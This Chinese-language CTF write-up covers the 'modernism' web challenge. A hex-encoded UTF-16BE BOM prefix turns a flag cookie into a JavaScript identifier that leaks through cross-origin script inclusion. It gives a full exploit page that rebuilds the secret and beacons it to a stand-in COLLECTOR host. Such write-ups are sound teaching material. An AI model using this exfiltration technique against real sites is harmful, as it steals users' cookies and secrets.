# modernism

## 题目简述

管理员机器人会先给目标域设置一个 `HttpOnly; Secure; SameSite=None` 的 `FLAG` Cookie，再访问攻击者提交的 URL。目标应用把十六进制参数 `p` 解码为任意前缀，并把 Cookie 原样追加到响应：

```python
prefix = bytes.fromhex(request.args.get("p", ""))
flag = request.cookies.get("FLAG", "uiuctf{FAKEFLAG}").encode()
return Response(prefix + flag, mimetype="text/plain")
```

同源策略阻止攻击者页面直接读取跨域响应，`HttpOnly` 也阻止 JavaScript 读取 Cookie；但跨域经典 `<script src>` 仍可携带目标域 Cookie并执行响应。问题转化为：只控制前缀、完全不能控制 flag 后缀时，怎样让整份响应成为合法 JavaScript，并把 flag 映射到可枚举的页面状态。

## 解题过程

### 用 UTF-16BE 改变后续字节的语法含义

前缀使用 UTF-16BE BOM `FE FF`，后面以 UTF-16BE 编码 `++window.`：

```text
FEFF 002B 002B 0077 0069 006E 0064 006F 0077 002E
```

拼成 URL 参数即：

```text
FEFF002B002B00770069006E0064006F0077002E
```

浏览器按 BOM 把整个脚本解释为 UTF-16BE。服务端追加的 ASCII flag 会每两个字节组成一个 Unicode code unit，例如字节 `75 69`（`ui`）会变成 `U+7569`。题目限定 flag 只含英文字母和固定外壳，这些成对后的字符会落入可作为 JavaScript 标识符的 Unicode 范围，于是响应在语法上等价于：

```javascript
++window.<由 flag 字节两两组成的 Unicode 标识符>
```

该属性原本是 `undefined`；前置自增把它转换成 `NaN` 并写回，因此在攻击者页面的 `window` 上新建一个属性。关键点是：跨域脚本在加载它的页面 realm 中执行，所以属性出现在攻击者自己的 `window`，无需读取目标响应。

### 从属性名还原原始字节

枚举页面全局属性，把每个 UTF-16 code unit 拆成高、低两个字节，再寻找 `uiuctf{` 前缀：

```javascript
function unpackUtf16BE(s) {
  return [...s].flatMap(c => [
    String.fromCharCode(c.charCodeAt(0) >> 8),
    String.fromCharCode(c.charCodeAt(0) & 0xff)
  ]).join('');
}

const flag = Object.getOwnPropertyNames(window)
  .map(unpackUtf16BE)
  .find(x => x.startsWith('uiuctf{'));
```

### 构造管理员访问页面

攻击者托管下面的 HTML，其中 `TARGET` 是题目服务域名，`COLLECTOR` 是自己记录请求的 HTTPS 端点：

```html
<!doctype html>
<meta charset="utf-8">

<script src="https://TARGET/?p=FEFF002B002B00770069006E0064006F0077002E"></script>
<script>
function unpackUtf16BE(s) {
  return [...s].flatMap(c => [
    String.fromCharCode(c.charCodeAt(0) >> 8),
    String.fromCharCode(c.charCodeAt(0) & 0xff)
  ]).join('');
}

const flag = Object.getOwnPropertyNames(window)
  .map(unpackUtf16BE)
  .find(x => x.startsWith('uiuctf{'));

navigator.sendBeacon(
  'https://COLLECTOR/',
  flag
);
</script>
```

把该页面 URL 提交给 bot。机器人加载目标脚本时自动带上 flag Cookie；第一段脚本创建带编码 flag 的属性，第二段立即还原并回传。仓库元数据记录的结果为：

```text
uiuctf{IqMDsheILiVLOcCOlllJdvjadLrmCjvFEQ}
```

## 方法总结

- 核心技巧：借 UTF-16BE BOM 让不可控 ASCII 秘密变成合法 Unicode 标识符，再用跨域脚本执行把该标识符写入攻击者可枚举的 `window` 属性。
- 识别信号：攻击者能控制响应前缀、秘密紧随其后、目标可作为跨域脚本加载、响应没有阻止 MIME sniffing 的 `X-Content-Type-Options: nosniff`。
- 复用要点：SOP 限制“读响应”，不等于禁止所有跨域资源产生可观测状态；字符集/BOM 会改变整份资源的解析方式。构造此类利用时还必须核对秘密长度、字节配对以及所有生成 code unit 是否能组成合法标识符。
